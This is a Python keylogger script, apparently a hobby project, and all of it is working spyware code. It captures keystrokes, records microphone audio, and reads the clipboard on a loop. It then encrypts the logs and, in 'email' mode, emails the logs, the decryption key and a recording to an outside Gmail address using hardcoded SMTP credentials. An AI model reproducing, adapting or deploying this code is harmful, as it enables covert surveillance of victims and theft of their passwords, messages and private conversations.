print('Starting Key Logger')

from pynput.keyboard import Key, Listener
import threading
from datetime import datetime
import sounddevice as sd
from scipy.io.wavfile import write
import win32clipboard
import time
from cryptography.fernet import Fernet
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os


# asking the user
answer = input("Do you want the keylogger to [email or file or terminal] ? ")

def terminal():
    def show(key):
        if hasattr(key, 'vk') and 96 <= key.vk <=105:
            print(key.vk - 96)
        else:
            print('\nYou Entered {0}'.format(key))
           
        if key == Key.delete:
            # Stop listener
            return False


    # Collect all event until released
    with Listener(on_press=show) as listener:
        listener.join()
            


# creating the file
def file_logs():
    f = open("logged_keys.txt", "a")
    f.write("\n")
    f.write("current time : " + str(datetime.now()))
    f.write("\n")
    f.close()


    def show(key):
        if hasattr(key, 'vk') and 96 <= key.vk <=105:
            f = open("logged_keys.txt", "a")
            f.write(str(key.vk - 96) + " ")
            f.close()

        else:
            f = open("logged_keys.txt", "a")
            f.write(str(key) + " ")
            f.close()

        if key == Key.delete:
            # Stop listener
            return False


    # Collect all event until released
    with Listener(on_press=show) as listener:
        listener.join()
        
        
        

# audio logging 
def audio_logging():
    Counter = 0
    while True:
        fs = 44100  # Sample rate
        seconds = 10  # Duration of recording
        Counter += 1
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()  # Wait until recording is finished
        write('Recorded_Audios\{}.wav'.format(Counter), fs, myrecording)  # Save as WAV file 
        print('-'*60)
        print(' Audio {} is saved'.format(Counter))
        print('-'*60)
        
 
def clipboard_logs():
    while True:
        time.sleep(10)
    # get clipboard data
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        print('-'*60)
        print('Clipboard Logs:    ', data)
        print('-'*60)
        f = open("logged_keys.txt", "a")
        f.write("\nClipboard is: " + data +'\n')
        f.close()
        
        
        
def encrypt_logs():
    while True:
        time.sleep(10)
            # key generation
        key = Fernet.generate_key()
        # using the generated key
        fernet = Fernet(key)
        
        with open('key.txt', 'wb') as key_file:
            key_file.write(key)
        
        # opening the original file to encrypt
        with open('logged_keys.txt', 'rb') as file:
            original = file.read()
            
        # encrypting the file
        encrypted = fernet.encrypt(original)
        
        # opening the file in write mode and 
        # writing the encrypted data
        with open('encrypted_logged_keys.txt', 'wb') as encrypted_file:
            encrypted_file.write(encrypted)
        print('-'*60)
        print('Logs are Encrypted successfully')
        print('-'*60)
        
        
        
def send_mail():
    
    while True:
        time.sleep(15)
        with open('encrypted_logged_keys.txt', 'rb') as encrypted_file:
            data = encrypted_file.read()
            
        with open('key.txt', 'rb') as key:
            key_data = key.read()

        mail_content = data.decode('UTF-8') + '\nKEY: '+ key_data.decode('UTF-8')
        #The mail addresses and password
        sender_address = 'Smtptest928@gmail.com'
        sender_pass = 'smtp0000'
        receiver_address = 'Ziad.amin.ahmed@gmail.com'
        #Setup the MIME
        message = MIMEMultipart()
        message['From'] = sender_address
        message['To'] = receiver_address
        message['Subject'] = 'A test mail sent by Python. It has an attachment.'
        #The subject line
        #The body and the attachments for the mail
        message.attach(MIMEText(mail_content, 'plain'))
        
        dir = "Recorded_Audios\\"
        attach_file_name = dir + '1.wav'
        attach_file = open(attach_file_name, 'rb') # Open the file as binary mode
        payload = MIMEBase('application', 'octate-stream')
        payload.set_payload((attach_file).read())
        encoders.encode_base64(payload) #encode the attachment
        #add payload header with filename
        payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
        message.attach(payload)

        #Create SMTP session for sending the mail
        session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
        session.starttls() #enable security
        session.login(sender_address, sender_pass) #login with mail_id and password
        text = message.as_string()
        session.sendmail(sender_address, receiver_address, text)
        session.quit()
        print('Mail Sent with Recorded Audio as attachment')
        

t0 = threading.Thread(target=terminal, args=())
t1 = threading.Thread(target=file_logs, args=())
t2 = threading.Thread(target=audio_logging, args=())
t3 = threading.Thread(target=clipboard_logs, args=())
t4 = threading.Thread(target=encrypt_logs, args=())
t5 = threading.Thread(target=send_mail, args=())

if answer == 'terminal':
    t0.start() # Terminal Output
    t2.start() # Audio
    t3.start() # Clipboard
    
elif answer == 'file':
    t1.start() #file
    t2.start() # Audio
    t3.start() # Clipboard
    t4.start() # Encryption
    
elif answer == 'email':
    t1.start() #file
    t2.start() # Audio
    t3.start() # Clipboard
    t4.start() # Encryption
    t5.start() # send mail
  
else:
    print('Wrong answer !!')
    
    
    